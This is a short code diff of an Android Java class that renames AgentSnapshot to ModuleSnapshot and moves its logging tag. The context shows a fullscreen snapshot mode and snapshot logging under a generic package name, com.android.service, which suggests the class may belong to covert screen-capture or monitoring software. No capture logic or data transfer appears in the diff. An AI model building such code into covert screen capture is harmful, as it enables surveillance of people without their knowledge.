@@ -40,13 +40,12 @@ import com.android.service.util.WChar;
 /**
  * The Class SnapshotAgent.
  */
-public class AgentSnapshot extends BaseInstantModule {
+public class ModuleSnapshot extends BaseInstantModule {
 
+	private static final String TAG = "ModuleSnapshot"; //$NON-NLS-1$
 	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 	private static final int MIN_TIMER = 1 * 1000;
 	private static final long SNAPSHOT_DELAY = 1000;
-
-	private static final String TAG = "AgentSnapshot"; //$NON-NLS-1$
 
 	/** The Constant CAPTURE_FULLSCREEN. */
 	final private static int CAPTURE_FULLSCREEN = 0;
@@ -64,7 +63,7 @@ public class AgentSnapshot extends BaseInstantModule {
 	/**
 	 * Instantiates a new snapshot agent.
 	 */
-	public AgentSnapshot() {
+	public ModuleSnapshot() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " SnapshotAgent constructor") ;//$NON-NLS-1$
 		}
